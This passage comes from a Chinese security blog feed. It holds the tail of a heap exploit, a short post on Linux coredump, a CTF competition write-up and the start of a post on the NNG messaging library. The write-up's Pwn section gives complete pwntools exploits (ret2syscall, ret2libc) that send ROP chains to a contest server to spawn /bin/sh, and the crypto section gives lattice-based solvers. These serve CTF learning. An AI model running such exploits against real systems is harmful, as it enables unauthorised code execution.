\n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;index: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, data</span>):<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;index: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>        sa(<span class="hljs-string">b&#x27;content: \n&#x27;</span>, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>():<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;Passwd: \n&#x27;</span>, <span class="hljs-string">b&#x27;1234567890\x00&#x27;</span>)<br><br><br>add(<span class="hljs-number">0x420</span>) <span class="hljs-comment">#Index 0</span><br>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#index 1</span><br>free(<span class="hljs-number">0</span>)<br>show()<br>libc_base = uu64() - <span class="hljs-number">0x1ebbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=libc_base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>ogg = libc_base + <span class="hljs-number">0xe6c7e</span><br><br><span class="hljs-comment">#debug(&#x27;b *$rebase(0x1429)&#x27;)</span><br><br>ad()<br>sa(<span class="hljs-string">b&#x27;name: \n&#x27;</span>, <span class="hljs-string">b&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>ret_addr = stack - <span class="hljs-number">0x18</span><br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>)<br><br>exit_hook = libc_base + <span class="hljs-number">0x222060</span> + <span class="hljs-number">3848</span><br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sa(<span class="hljs-string">b&#x27;WRITE MODE: \n&#x27;</span>, p64(exit_hook))<br>sleep(<span class="hljs-number">1</span>)<br>s(p64(ogg))<br><span class="hljs-comment">#pause()</span><br><br>ia()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝帽杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识coredump</title>
    <link href="/2023/08/21/coredump/"/>
    <url>/2023/08/21/coredump/</url>
    
    <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>今天在分析TBOX的过程中，发现了一个<code>CoredumpService</code>的服务，具体代码涉及保密，就不放出来了，fw的我之前并不知道coredump是什么东西，所以来学习记录一下。</p><h3 id="什么是coredump"><a href="#什么是coredump" class="headerlink" title="什么是coredump"></a>什么是coredump</h3><p>coredump顾名思义就是核心转储。我们的应用程序在运行过程中，如果发生了异常crash，光靠程序自身的log是很难定位到根因的，所以操作系统提供了一套coredump机制。这套机制可以在crash发生的时候，把进程现场的vma信息存储到coredump文件中去。利用这个文件，就可以恢复异常现场的信息，分析人员可以从中获取到<strong>变量值、栈信息、内存数据、程序crash时的运行位置等</strong>。</p><h3 id="coredump是如何生成的"><a href="#coredump是如何生成的" class="headerlink" title="coredump是如何生成的"></a>coredump是如何生成的</h3><p><img src="/mdimg/Linux/coredump1.png"></p><p>当应用程序发生crash时，会陷入到内核进行异常处理，此时内核会产生一个信号(signal)发送给对应的进程。当进程从内核态到用户态切换时，该进程会处理这个信号。此类信号（比如SEGV）的默认处理行为就会生成一个coredump文件。当然，手动给某个应用程序发送这类信号，也是可以生成对应的coredump文件的，例如<code>kill -9 pidof xxx</code></p><h4 id="哪些信号可以产生coredump文件"><a href="#哪些信号可以产生coredump文件" class="headerlink" title="哪些信号可以产生coredump文件"></a>哪些信号可以产生coredump文件</h4><p><img src="/mdimg/Linux/coredump2.png"></p><p>可以看到3、4、6、8、11都能产生的信号， 默认都会产生coredump行为。如果修改了进程对这类信号的处理，则不会产生coredump了。</p><h4 id="保存的coredump文件在什么地方"><a href="#保存的coredump文件在什么地方" class="headerlink" title="保存的coredump文件在什么地方"></a>保存的coredump文件在什么地方</h4><p><code>/proc/sys/kernel/core_pattern </code>指定coredump文件存储的位置，缺省值是core，表示将coredump文件存储到当前目录。这个pattern是可以定制的，模式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">%p  进程的PID<br>%u  进程的UID<br>%s  造成coredump的signal号<br>%t  coredump生成的时间，从<span class="hljs-number">1970</span>-01-01 <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>开始的秒数<br>%e  出Core进程对应的可执行文件名<br></code></pre></td></tr></table></figure><p>例如：<code>echo &quot;/corefile/core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern</code>，表示coredump路径为/corefile，文件名的格式为”core-可执行文件名-pid-时间”。</p><p><code>/proc/sys/kernel/core_uses_pid</code> 取值是0或者1，表示是否在coredump文件名字后面加上进程号</p><h4 id="coredump文件会把进程地址空间的哪些内容保存下来"><a href="#coredump文件会把进程地址空间的哪些内容保存下来" class="headerlink" title="coredump文件会把进程地址空间的哪些内容保存下来"></a>coredump文件会把进程地址空间的哪些内容保存下来</h4><p><code>/proc/$pid/coredump_filter</code> 设置那些内存会被dump出来，需要在程序启动之后进行设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">bit <span class="hljs-number">0</span>  Dump anonymous private mappings.<br>bit <span class="hljs-number">1</span>  Dump anonymous shared mappings.<br>bit <span class="hljs-number">2</span>  Dump file-backed private mappings.<br>bit <span class="hljs-number">3</span>  Dump file-backed shared mappings.<br>bit <span class="hljs-number">4</span> (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.24</span>) Dump ELF headers.<br>bit <span class="hljs-number">5</span> (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.28</span>) Dump private huge pages.<br>bit <span class="hljs-number">6</span> (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.28</span>) Dump shared huge pages.<br></code></pre></td></tr></table></figure><p>coredump_filter的默认值是0x33，也即发生coredump时会将所有anonymous内存、ELF头页面、hugetlb private memory内容保存。</p><h4 id="如何控制coredump文件的大小"><a href="#如何控制coredump文件的大小" class="headerlink" title="如何控制coredump文件的大小"></a>如何控制coredump文件的大小</h4><p>ulimit -c决定save的coredump文件大小限制，如果保存的文件小于设定的限制，则不会创建coredump文件。如果不想限制大小，需要设置<code>ulimit -c unlimited</code>。但是输入后只对执行这个命令的进程，及其后面fork出来的进程有效，已经运行的进程无效。例如，init进程在执行<code>ulimit -c unlimited</code>之前，运行了一个进程a，则进程a crash的时候不会产生coredump。</p><p>太烧脑了，下次再学。。。。。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三届山石网科夏令营</title>
    <link href="/2023/08/21/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E6%9A%91%E5%81%87CTF%E8%AE%AD%E7%BB%83%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9B/"/>
    <url>/2023/08/21/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E6%9A%91%E5%81%87CTF%E8%AE%AD%E7%BB%83%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>下班之余来打一场炸鱼赛（主要心水小礼品哈哈哈）第一次摸到了第一，我也是网络安全大赛冠军🥵</p><p><img src="/mdimg/2023sswk/1.jpg"></p><p>md 蚌埠住了 冬令营还有保温杯啥的呢！这次居然就给我一本从0到1😅原地送给新生当纪念品了。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="babyNTRU"><a href="#babyNTRU" class="headerlink" title="babyNTRU"></a>babyNTRU</h3><p>格基规约求f和g</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">18265166690888475568508205788351723108492598063556694453866020018612082716314197018581664220266891343266826262103380794092636040577744226926080805739120171556812778934479727248098841525477772831490126199548545786503110837372880363428957764884329593924744941695642013585909156506088780643030023164855973833306872727463131996134184118614172430586758877233701077685751718260071836310060281140572946121079034501926660471152233585368113925178752435191910762241019003537704885083238106369534830393975302288404167836930602217985985847446070323598776341522649183248452794742376328444827351843724799192817079741161233112260479</span><br>h = <span class="hljs-number">4967224096990794383219394548021661512726675694147838134779085870532422860903557980609209611713600051085944165443541629919867486254693404349210710383848787111293470866844887628407505277639836299797939984616893146647351591326606770521678401285613589626410018479980831585926061303904550146343466643582612670862834763887770328979710431031177418547347283523083258882829675470842927115407426622663316454822399636240738287665733629112976904877165355516610469901309760380900426025418466453719738514032928207738877975591007250792160137047114036933809472387873650910438263376962726381797927297555569681381513766206991560665841</span><br>c = <span class="hljs-number">16817585342429374146630376920213715475053842668013412994500648477443919828494694587495599063908719008851497141935769861968183626958443589329598781614352147198572062882796132537628308726395654751145080742405050157500585726017502230322869060570158864938641538722583753556090927664838782228764769369834459631417465435803556700281096974029668813698732758153249834904501478272838991307791205987117636747526652824803482977910064904853019629040285700901775083075557874528402638028712625642698991805017963162010854671654728900722088963013805447853328852730983161366447618298248888612010461342887166024478519281752219951330472</span><br><br>K=<span class="hljs-number">2</span>**(bits//<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)<br>v1 = vector(ZZ, [<span class="hljs-number">1</span>, h*K])<br>v2 = vector(ZZ, [<span class="hljs-number">0</span>, p*K])<br>m = matrix([v1, v2])<br>f, g = m.LLL()[<span class="hljs-number">1</span>]<br>g = g//K<br><span class="hljs-comment">#print(f,g)</span><br><br>a = f * c % p % g<br>m = ZZ(c * f % q) * inverse_mod(f, g) % g<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><br><span class="hljs-comment">#HSNCTF&#123;d148fc5f-a646-4e60-a739-0bd0be98acd4&#125;</span><br></code></pre></td></tr></table></figure><h3 id="babyHNP"><a href="#babyHNP" class="headerlink" title="babyHNP"></a>babyHNP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">q = <span class="hljs-number">11617715374360202288596693614790746639041280065515420354170463717765818460765992548652144591072405216278802974122732716944329876299701631478958721643071613</span><br>A = [<span class="hljs-number">11205052163260879279779370027300388478563443748738386851258833175732815177918017923156408522968360233660245388669805196022826655093066229550671451036244177</span>, <span class="hljs-number">4587207419689873871671379475501060352361231709208665709260842495737444139113663532344038909684079685643293993271298355108298467058894209863221986043222103</span>, <span class="hljs-number">10892919356115964033441271848254373740150765391546241788365946905744103719741126554964746464277556730869654695377121263714138165633966013875792234902620232</span>, <span class="hljs-number">10388792144961373833428258161261768867774084238986429927755268743714106636512322654152268221431850066914109192294030406670197964112088034757687400251674294</span>, <span class="hljs-number">11168854651301071762033749829324982832429309270098022559190141243813683288587800229160507152432884446347484607384244984898130514154822876542001332189154040</span>]<br>b = [<span class="hljs-number">206397678313339208910331992242857106765</span>, <span class="hljs-number">248314924649425376092667318144109655550</span>, <span class="hljs-number">116605977425896048557273717492096177262</span>, <span class="hljs-number">130883156720507560420446459921008261211</span>, <span class="hljs-number">254134740809858803078213400623952076908</span>]<br><br>a = [ZZ(i*inverse_mod(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>, q)%q) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A]<br>b = [ZZ(i*inverse_mod(<span class="hljs-number">2</span>**<span class="hljs-number">128</span>, q)%q) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b]<br><br>n = <span class="hljs-number">4</span><br>L0 = matrix(ZZ, <span class="hljs-number">1</span>, n)<br>L1 = matrix(ZZ, <span class="hljs-number">1</span>, n)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    _a0 = inverse_mod(a[<span class="hljs-number">0</span>], q)<br>    L0[<span class="hljs-number">0</span>, i] = ZZ(a[i+<span class="hljs-number">1</span>]*_a0%q)<br>    L1[<span class="hljs-number">0</span>, i] = ZZ((b[<span class="hljs-number">0</span>]*a[i+<span class="hljs-number">1</span>]-b[i+<span class="hljs-number">1</span>]*a[<span class="hljs-number">0</span>])*_a0%q)<br>L = block_matrix([<br>    [<span class="hljs-number">1</span>, L0, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, L1, ZZ(q)],<br>    [<span class="hljs-number">0</span>, ZZ(q), <span class="hljs-number">0</span>]<br>]).LLL()<br><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> L:<span class="hljs-built_in">print</span>([_.nbits() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> row])<br>e0 = <span class="hljs-built_in">abs</span>(L[-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])<br>m = ZZ((b[<span class="hljs-number">0</span>]+e0)*inverse_mod(a[<span class="hljs-number">0</span>], q)%q)<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br><span class="hljs-comment"># HSNCTF&#123;d05dd7e4-9ee0-4ce1-b358-a4e5209555df&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>sa = <span class="hljs-keyword">lambda</span> s,n : sh.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : sh.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : sh.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : sh.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : sh.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : sh.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span> s = <span class="hljs-literal">False</span> : sh.recvline(s)<br>ti = <span class="hljs-keyword">lambda</span> : sh.interactive()<br><br>sh = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>sh = remote(<span class="hljs-string">&#x27;58.240.236.231&#x27;</span>, <span class="hljs-number">49003</span>)<br>syscall = <span class="hljs-number">0x0000000000400741</span><br>pop_rdi = <span class="hljs-number">0x000000000040072b</span><br>pop_rsi = <span class="hljs-number">0x0000000000400735</span><br>pop_rdx = <span class="hljs-number">0x000000000040073f</span><br>pop_rax = <span class="hljs-number">0x0000000000400721</span><br><br>rop = p64(pop_rax) + p64(<span class="hljs-number">59</span>)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">0x0000000000601048</span>)<br>rop += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rdx) + p64(<span class="hljs-number">0</span>)<br>rop += p64(syscall)<br><br>sla(<span class="hljs-string">&#x27;input:&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + rop)<br><br>ti()<br></code></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.endian = <span class="hljs-string">&#x27;little&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>sa = <span class="hljs-keyword">lambda</span> s,n : sh.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : sh.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : sh.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : sh.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : sh.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : sh.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span> s = <span class="hljs-literal">False</span> : sh.recvline(s)<br>ti = <span class="hljs-keyword">lambda</span> : sh.interactive()<br><br>sh = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/ccc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)<br>sh = remote(<span class="hljs-string">&#x27;58.240.236.231&#x27;</span>, <span class="hljs-number">49002</span>)<br>pop_rdi = <span class="hljs-number">0x0000000000400783</span><br>pop_rsi2 = <span class="hljs-number">0x0000000000400781</span><br>main = <span class="hljs-number">0x0000000004006FD</span><br>leak = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd8</span> + p64(pop_rdi) + p64(<span class="hljs-number">0x0000000000601018</span>) + p64(<span class="hljs-number">0x0000000000400520</span>) + p64(main)<br>sla(<span class="hljs-string">&#x27;name:&#x27;</span>, leak)<br><br>libc_base = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>og = libc_base + <span class="hljs-number">0xf1247</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd8</span> + p64(og)<br>sla(<span class="hljs-string">&#x27;name:&#x27;</span>, payload)<br>ti()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="HSAndroid1"><a href="#HSAndroid1" class="headerlink" title="HSAndroid1"></a>HSAndroid1</h3><p>还以为和冬令营一模一样的题，结果看错了对象。上面的混淆运算才是flag</p><p><img src="/mdimg/2023sswk/6.png"></p><p>chatGPT写个脚本完事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">charArr = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;0db530c0e9752357b1ae4cf7ea8331ae&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">4</span>):<br>        temp = charArr[j]<br>        charArr[j] = charArr[j - <span class="hljs-number">4</span>]<br>        charArr[j - <span class="hljs-number">4</span>] = temp<br><br>    <br>    temp2 = charArr[i - <span class="hljs-number">1</span>]<br>    charArr[i - <span class="hljs-number">1</span>] = charArr[i - <span class="hljs-number">2</span>]<br>    charArr[i - <span class="hljs-number">2</span>] = temp2<br><br>original_string = <span class="hljs-string">&quot;&quot;</span>.join(charArr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Original String:&quot;</span>, original_string)<br><br><span class="hljs-comment">#hsnctf&#123;d35b300c92570e57b1ae4cf7ea8331ae&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>这个没什么好说的。</p><h3 id="easyusb"><a href="#easyusb" class="headerlink" title="easyusb"></a>easyusb</h3><p>板子题 注意有<code>[CAPS]</code> 所以解压密码为全大写 解开压缩包就是flag</p><p><img src="/mdimg/2023sswk/7.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>三个原题，一个不咋会web的人拿了三个前三血</p><h3 id="primitive"><a href="#primitive" class="headerlink" title="primitive"></a>primitive</h3><p>今年冬令营一模一样的题 参考我自己的博客</p><p><a href="https://g1at.github.io/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/#Primitive-php">https://g1at.github.io/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/#Primitive-php</a></p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>[BJDCTF2020]原题，你猜我怎么找到的，Google识图😂</p><p><a href="https://www.jianshu.com/p/7092f56dcbbc">https://www.jianshu.com/p/7092f56dcbbc</a></p><h3 id="uns"><a href="#uns" class="headerlink" title="uns"></a>uns</h3><p>CTFshow原题   唯一变化就是admin.php改成了session.php</p><p><a href="https://blog.csdn.net/Kracxi/article/details/122885954">https://blog.csdn.net/Kracxi/article/details/122885954</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NNG协议</title>
    <link href="/2023/08/10/NNG/"/>
    <url>/2023/08/10/NNG/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><a href="https://github.com/nanomsg/nng">NNG</a> 是 nanomsg 的继任版本，而 nanomsg 则是流行的 ZMQ （一个简单好用的传输层，像框架一样的一个 socket library）的 C 重写版。</p><p>NNG 将通信使用的协议和传输分离，同一个协议可以工作在不同的传输层上，类似与 TCP/IP 的应用层和传输层的分层，同时接口上屏蔽了底层细节，统一用字符串 URL 来描述传输模式。这样当使用场景修改时，可以通过简单修改 URL 来实现适应，极具灵活性。</p><p>同时如 NNG 描述所言 “light-weight brokerless messaging”，NNG 中的通信各方是不需要第三方程序介入的，这与 MQTT/Redis 通信需要服务器不同。这样很适合作为通信库来使用而没有其他依赖。</p><p>以下是一些 nng 的主要特点：</p><ol><li>协议独立性： nng 提供了多种通信模式（协议），如请求-回复、发布-订阅、推送-拉取等。每种模式都有相应的协议，使开发人员能够根据应用程序的需求选择适当的通信方式。</li><li>轻量级： nng 的设计着重于保持轻量级和高性能。它专注于提供基本的通信机制，避免过多的复杂性。</li><li>可扩展性： nng 允许开发人员在需要的时候添加新的传输协议，以适应不同的通信需求。这使得 nng 在不同的场景中都能够发挥作用。</li><li>错误处理和可靠性： nng 设计了更好的错误处理机制，以便在通信出现问题时更好地报告和处理错误。它还提供了一些协议，如 REQ/REP，以实现可靠的请求和回复模式。</li><li>异步通信： nng 支持异步通信模式，使开发人员能够实现高效的并发操作。</li><li>跨平台： nng 可在多个操作系统上运行，包括 Linux、Windows 和 macOS。</li></ol><h2 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h2><ul><li>PAIR 一对一双向通信。</li><li>PIPELINE(PUSH/PULL) 单向通信，类似与生产者消费者模型的消息队列。</li><li>PUB/SUB 单向广播。</li><li>REQ/REP 请求-应答模式，类似与 RPC 模式。</li><li>BUS 网状连接通信，每个加入节点都可以发送/接受广播消息。</li><li>SURVEY 用于多节点表决或者服务发现。</li></ul><h2 id="传输模式"><a href="#传输模式" class="headerlink" title="传输模式"></a>传输模式</h2><ul><li>inproc 进程内线程间传输</li><li>ipc 